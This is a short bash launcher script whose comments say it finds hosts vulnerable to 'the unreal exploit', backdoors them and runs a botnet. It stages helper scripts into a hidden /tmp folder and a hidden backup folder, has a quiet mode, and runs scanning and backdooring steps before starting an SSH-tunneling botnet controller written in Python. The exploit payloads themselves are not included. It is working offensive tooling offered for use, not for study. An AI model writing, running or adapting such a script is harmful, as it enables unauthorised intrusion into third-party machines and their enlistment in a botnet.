#!/bin/bash

#This file finds targets vulnerable to the unreal exploit
#Proceeds to backdoor them, and runs the botnet

#NOTE: Run as root

FOLDER=/tmp/.attack-files
BACKUP=~/.ops
QUIET=0

if [ "$1" == "-q" ]; then
	QUIET=1
fi

if [ ! -d $FOLDER ]; then
	mkdir $FOLDER
fi

if [ ! -d $BACKUP ]; then
	mkdir $BACKUP
fi

if [ ! -s $FOLDER/target_hunter.sh ]; then
	if [ -s ~/target_hunter.sh ]; then
		mv ~/target_hunter.sh $BACKUP
		cp $BACKUP/target_hunter.sh $FOLDER
	elif [ -s $BACKUP/target_hunter.sh ]; then
		cp $BACKUP/target_hunter.sh $FOLDER
	else
		if [ $QUIET -eq 0 ]; then
			echo Please place target_hunter.sh in $FOLDER/
		fi
		exit -1
	fi
fi

if [ ! -s $FOLDER/target_ballista.sh ]; then
	if [ -s ~/target_ballista.sh ]; then
		mv ~/target_ballista.sh $BACKUP
		cp $BACKUP/target_ballista.sh $FOLDER
	elif [ -s $BACKUP/target_ballista.sh ]; then
		cp $BACKUP/target_ballista.sh $FOLDER
	else
		if [ $QUIET -eq 0 ]; then
			echo Please place target_ballista.sh in $FOLDER/
		fi
		exit -1
	fi
fi

if [ ! -s $FOLDER/main.py ]; then
	if [ -s ~/main.py ]; then
		mv ~/main.py $BACKUP
		cp $BACKUP/main.py $FOLDER
	elif [ -s $BACKUP/main.py ]; then
		cp $BACKUP/main.py $FOLDER
	else
		if [ $QUIET -eq 0 ]; then
			echo Please place main.py in $FOLDER/
		fi
		exit -1
	fi
fi

chmod 700 $FOLDER/*.sh


#Runs IP Gathering and Backoors Targets
if [ $QUIET -eq 1 ]; then
	$FOLDER/target_hunter.sh -q; $FOLDER/target_ballista.sh -q
else	
	$FOLDER/target_hunter.sh; $FOLDER/target_ballista.sh
fi


#Runs SSH Tunneling/Botnet
python2.7 $FOLDER/main.py
